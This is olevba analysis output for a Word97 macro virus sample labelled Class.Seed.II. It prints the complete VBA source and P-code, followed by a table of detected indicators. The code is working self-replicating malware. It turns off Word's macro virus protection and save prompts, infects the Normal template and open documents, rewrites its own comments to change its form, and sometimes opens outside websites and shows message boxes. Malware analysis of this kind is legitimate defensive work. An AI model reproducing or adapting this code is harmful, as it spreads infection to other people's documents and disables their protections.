olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.s2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.s2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'1260725744891540719504126072574489154071950412607257448915407195041260725744891540719504
Randomize
'9361335736944422225936133573694442222593613357369444222259361335736944422225
x = 0: o = 0
'10583180112420650839616105831801124206508396161058318011242065083961610583180112420650839616
On Error GoTo 93
'16749620316932004136609167496203169320041366091674962031693200413660916749620316932004136609
Options.VirusProtection = False
'2266801248143360565824226680124814336056582422668012481433605658242266801248143360565824
Options.SaveNormalPrompt = False
'4325692828915961542921432569282891596154292143256928289159615429214325692828915961542921
Options.ConfirmConversions = False
'3213952562528189066816321395256252818906681632139525625281890668163213952562528189066816
fx = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'372844572114288855296372844572114288855296372844572114288855296372844572114288855296
xf = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'3194736484110334016319473648411033401631947364841103340163194736484110334016
If xf > 96 And fx > 0 Then GoTo 93
'318129840938479530244318129840938479530244318129840938479530244318129840938479530244
If xf < 96 Then
'4837624291649524051600483762429164952405160048376242916495240516004837624291649524051600
    Set xs = NormalTemplate.VBProject.VBComponents.Item(1)
'2057359922527128725264205735992252712872526420573599225271287252642057359922527128725264
    ActiveDocument.VBProject.VBComponents.Item(1).Name = xs.Name
'7016777166429338208656701677716642933820865670167771664293382086567016777166429338208656
    ActiveDocument.VBProject.VBComponents.Item(1).Export Application.StartupPath & "seedii$.dll"
'13444322222519281544164134443222225192815441641344432222251928154416413444322222519281544164
End If
'568493417617033002769568493417617033002769568493417617033002769568493417617033002769
If fx = 0 Then Set xs = ActiveDocument.VBProject.VBComponents.Item(1)
'15386320051635112388689153863200516351123886891538632005163511238868915386320051635112388689
k = Int(Rnd(1) * 100) + 1
'208513600361988676208513600361988676208513600361988676208513600361988676
If k = 99 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.cannabisculture.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(73) + Chr(73)
'1207965633641848140100120796563364184814010012079656336418481401001207965633641848140100
l = Int(Rnd(1) * 75) + 1
'1487135819565962310656148713581956596231065614871358195659623106561487135819565962310656
If l = 74 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.Microsoft.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(73) + Chr(73)
'212311126812447577729212311126812447577729212311126812447577729212311126812447577729
m = Int(Rnd(1) * 50) + 1
'4696192384939151349689469619238493915134968946961923849391513496894696192384939151349689
If m = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(80) + Chr(82) + Chr(79) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
'151681392812028061156151681392812028061156151681392812028061156151681392812028061156
n = Int(Rnd(1) * 25) + 1
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
If n = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(32) + Chr(73) + Chr(73)
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
xs.codemodule.AddFromFile Application.StartupPath & "seedii$.dll"
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
With xs.codemodule
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
    For p = 1 To 4
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
    .deletelines 1
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
    Next p
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
End With
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
If xf < 96 Then
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
    With xs.codemodule
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
    .replaceline 1, "Sub AutoClose()"
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
    .replaceline 99, "Sub ToolsMacro()"
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
    End With
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
End If
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
With xs.codemodule
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
    For p = 2 To 44 Step 2
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
    x = Int(Rnd(414835) * 403989) + 8485
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
    o = Int(Rnd(298368) * 235865) + 2988
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
    .replaceline p, "'" & x * x & o * o & x * x & o * o & x * x & o * o & x * x & o * o
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
Next p
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
    For xp = 46 To 98 Step 2
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
    .replaceline xp, "'" & Application.Assistant & Application.DisplayRecentFiles & Application.FocusInMailHeader & Application.Build & Application.StartupPath & Application.ActiveDocument & Application.Version
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
Next xp
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
End With
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
93:
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
If xf > 98 And fx = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
End Sub
'The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a
Sub ViewVBCode()
'Word97/Class.Seed.II by Virus :) Smile!
End Sub




-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.s2
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11751 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	QuoteRem 0x0000 0x0058 "1260725744891540719504126072574489154071950412607257448915407195041260725744891540719504"
' Line #2:
' 	ArgsCall Read 0x0000 
' Line #3:
' 	QuoteRem 0x0000 0x004C "9361335736944422225936133573694442222593613357369444222259361335736944422225"
' Line #4:
' 	LitDI2 0x0000 
' 	St x 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St o 
' Line #5:
' 	QuoteRem 0x0000 0x005C "10583180112420650839616105831801124206508396161058318011242065083961610583180112420650839616"
' Line #6:
' 	OnError 93 
' Line #7:
' 	QuoteRem 0x0000 0x005C "16749620316932004136609167496203169320041366091674962031693200413660916749620316932004136609"
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	QuoteRem 0x0000 0x0058 "2266801248143360565824226680124814336056582422668012481433605658242266801248143360565824"
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #11:
' 	QuoteRem 0x0000 0x0058 "4325692828915961542921432569282891596154292143256928289159615429214325692828915961542921"
' Line #12:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #13:
' 	QuoteRem 0x0000 0x0058 "3213952562528189066816321395256252818906681632139525625281890668163213952562528189066816"
' Line #14:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St fx 
' Line #15:
' 	QuoteRem 0x0000 0x0054 "372844572114288855296372844572114288855296372844572114288855296372844572114288855296"
' Line #16:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd CountOfLines 
' 	St xf 
' Line #17:
' 	QuoteRem 0x0000 0x004C "3194736484110334016319473648411033401631947364841103340163194736484110334016"
' Line #18:
' 	Ld xf 
' 	LitDI2 0x0060 
' 	Gt 
' 	Ld fx 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo 93 
' 	EndIf 
' Line #19:
' 	QuoteRem 0x0000 0x0054 "318129840938479530244318129840938479530244318129840938479530244318129840938479530244"
' Line #20:
' 	Ld xf 
' 	LitDI2 0x0060 
' 	Lt 
' 	IfBlock 
' Line #21:
' 	QuoteRem 0x0000 0x0058 "4837624291649524051600483762429164952405160048376242916495240516004837624291649524051600"
' Line #22:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set xs 
' Line #23:
' 	QuoteRem 0x0000 0x0058 "2057359922527128725264205735992252712872526420573599225271287252642057359922527128725264"
' Line #24:
' 	Ld xs 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #25:
' 	QuoteRem 0x0000 0x0058 "7016777166429338208656701677716642933820865670167771664293382086567016777166429338208656"
' Line #26:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000B "seedii$.dll"
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #27:
' 	QuoteRem 0x0000 0x005C "13444322222519281544164134443222225192815441641344432222251928154416413444322222519281544164"
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	QuoteRem 0x0000 0x0054 "568493417617033002769568493417617033002769568493417617033002769568493417617033002769"
' Line #30:
' 	Ld fx 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set xs 
' 	EndIf 
' Line #31:
' 	QuoteRem 0x0000 0x005C "15386320051635112388689153863200516351123886891538632005163511238868915386320051635112388689"
' Line #32:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St k 
' Line #33:
' 	QuoteRem 0x0000 0x0048 "208513600361988676208513600361988676208513600361988676208513600361988676"
' Line #34:
' 	Ld k 
' 	LitDI2 0x0063 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld wdWindowStateMinimize 
' 	Ld ActiveWindow 
' 	MemSt WindowState 
' 	BoS 0x0000 
' 	LitStr 0x001E "http://www.cannabisculture.com"
' 	ParamNamed Address 
' 	LitVarSpecial (False)
' 	ParamNamed NewWindow 
' 	LitVarSpecial (False)
' 	ParamNamed AddHistory 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ParamNamed ExtraInfo 
' 	Ld ActiveDocument 
' 	ArgsMemCall FollowHyperlink 0x0004 
' 	EndIf 
' Line #35:
' 	QuoteRem 0x0000 0x0058 "1207965633641848140100120796563364184814010012079656336418481401001207965633641848140100"
' Line #36:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x004B 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St l 
' Line #37:
' 	QuoteRem 0x0000 0x0058 "1487135819565962310656148713581956596231065614871358195659623106561487135819565962310656"
' Line #38:
' 	Ld l 
' 	LitDI2 0x004A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld wdWindowStateMinimize 
' 	Ld ActiveWindow 
' 	MemSt WindowState 
' 	BoS 0x0000 
' 	LitStr 0x0018 "http://www.Microsoft.com"
' 	ParamNamed Address 
' 	LitVarSpecial (False)
' 	ParamNamed NewWindow 
' 	LitVarSpecial (False)
' 	ParamNamed AddHistory 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ParamNamed ExtraInfo 
' 	Ld ActiveDocument 
' 	ArgsMemCall FollowHyperlink 0x0004 
' 	EndIf 
' Line #39:
' 	QuoteRem 0x0000 0x0054 "212311126812447577729212311126812447577729212311126812447577729212311126812447577729"
' Line #40:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St m 
' Line #41:
' 	QuoteRem 0x0000 0x0058 "4696192384939151349689469619238493915134968946961923849391513496894696192384939151349689"
' Line #42:
' 	Ld m 
' 	LitDI2 0x0031 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #43:
' 	QuoteRem 0x0000 0x0054 "151681392812028061156151681392812028061156151681392812028061156151681392812028061156"
' Line #44:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St n 
' Line #45:
' 	QuoteRem 0x0000 0x005D "The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a"
' Line #46:
' 	Ld n 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' 	EndIf 
' Line #47:
' 	QuoteRem 0x0000 0x005D "The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a"
' Line #48:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000B "seedii$.dll"
' 	Concat 
' 	Ld xs 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #49:
' 	QuoteRem 0x0000 0x005D "The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a"
' Line #50:
' 	StartWithExpr 
' 	Ld xs 
' 	MemLd codemodule 
' 	With 
' Line #51:
' 	QuoteRem 0x0000 0x005D "The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a"
' Line #52:
' 	StartForVariable 
' 	Ld p 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #53:
' 	QuoteRem 0x0000 0x005D "The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a"
' Line #54:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #55:
' 	QuoteRem 0x0000 0x005D "The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a"
' Line #56:
' 	StartForVariable 
' 	Ld p 
' 	EndForVariable 
' 	NextVar 
' Line #57:
' 	QuoteRem 0x0000 0x005D "The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a"
' Line #58:
' 	EndWith 
' Line #59:
' 	QuoteRem 0x0000 0x005D "The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a"
' Line #60:
' 	Ld xf 
' 	LitDI2 0x0060 
' 	Lt 
' 	IfBlock 
' Line #61:
' 	QuoteRem 0x0000 0x005D "The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a"
' Line #62:
' 	StartWithExpr 
' 	Ld xs 
' 	MemLd codemodule 
' 	With 
' Line #63:
' 	QuoteRem 0x0000 0x005D "The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a"
' Line #64:
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #65:
' 	QuoteRem 0x0000 0x005D "The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a"
' Line #66:
' 	LitDI2 0x0063 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #67:
' 	QuoteRem 0x0000 0x005D "The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a"
' Line #68:
' 	EndWith 
' Line #69:
' 	QuoteRem 0x0000 0x005D "The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a"
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	QuoteRem 0x0000 0x005D "The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a"
' Line #72:
' 	StartWithExpr 
' 	Ld xs 
' 	MemLd codemodule 
' 	With 
' Line #73:
' 	QuoteRem 0x0000 0x005D "The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a"
' Line #74:
' 	StartForVariable 
' 	Ld p 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x002C 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #75:
' 	QuoteRem 0x0000 0x005D "The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a"
' Line #76:
' 	LitDI4 0x5473 0x0006 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0x2A15 0x0006 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x2125 
' 	Add 
' 	St x 
' Line #77:
' 	QuoteRem 0x0000 0x005D "The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a"
' Line #78:
' 	LitDI4 0x8D80 0x0004 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0x9959 0x0003 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0BAC 
' 	Add 
' 	St o 
' Line #79:
' 	QuoteRem 0x0000 0x005D "The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a"
' Line #80:
' 	Ld p 
' 	LitStr 0x0001 "'"
' 	Ld x 
' 	Ld x 
' 	Mul 
' 	Concat 
' 	Ld o 
' 	Ld o 
' 	Mul 
' 	Concat 
' 	Ld x 
' 	Ld x 
' 	Mul 
' 	Concat 
' 	Ld o 
' 	Ld o 
' 	Mul 
' 	Concat 
' 	Ld x 
' 	Ld x 
' 	Mul 
' 	Concat 
' 	Ld o 
' 	Ld o 
' 	Mul 
' 	Concat 
' 	Ld x 
' 	Ld x 
' 	Mul 
' 	Concat 
' 	Ld o 
' 	Ld o 
' 	Mul 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #81:
' 	QuoteRem 0x0000 0x005D "The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a"
' Line #82:
' 	StartForVariable 
' 	Ld p 
' 	EndForVariable 
' 	NextVar 
' Line #83:
' 	QuoteRem 0x0000 0x005D "The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a"
' Line #84:
' 	StartForVariable 
' 	Ld xp 
' 	EndForVariable 
' 	LitDI2 0x002E 
' 	LitDI2 0x0062 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #85:
' 	QuoteRem 0x0000 0x005D "The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a"
' Line #86:
' 	Ld xp 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd Assistant 
' 	Concat 
' 	Ld Application 
' 	MemLd DisplayRecentFiles 
' 	Concat 
' 	Ld Application 
' 	MemLd FocusInMailHeader 
' 	Concat 
' 	Ld Application 
' 	MemLd Build 
' 	Concat 
' 	Ld Application 
' 	MemLd StartupPath 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	Concat 
' 	Ld Application 
' 	MemLd Version 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #87:
' 	QuoteRem 0x0000 0x005D "The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a"
' Line #88:
' 	StartForVariable 
' 	Ld xp 
' 	EndForVariable 
' 	NextVar 
' Line #89:
' 	QuoteRem 0x0000 0x005D "The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a"
' Line #90:
' 	EndWith 
' Line #91:
' 	QuoteRem 0x0000 0x005D "The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a"
' Line #92:
' 	LineNum 93 
' 	BoS 0x0000 
' Line #93:
' 	QuoteRem 0x0000 0x005D "The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a"
' Line #94:
' 	Ld xf 
' 	LitDI2 0x0062 
' 	Gt 
' 	Ld fx 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #95:
' 	QuoteRem 0x0000 0x005D "The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a"
' Line #96:
' 	EndSub 
' Line #97:
' 	QuoteRem 0x0000 0x005D "The GeniusTrueFalse8.0.4412c:\program files\microsoft office\office\startupLaffADayII.doc8.0a"
' Line #98:
' 	FuncDefn (Sub ViewVBCode())
' Line #99:
' 	QuoteRem 0x0000 0x0027 "Word97/Class.Seed.II by Virus :) Smile!"
' Line #100:
' 	EndSub 
' Line #101:
' Line #102:
' Line #103:
' Line #104:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.cannabisc|URL                                          |
|          |ulture.com          |                                             |
|IOC       |http://www.Microsoft|URL                                          |
|          |.com                |                                             |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

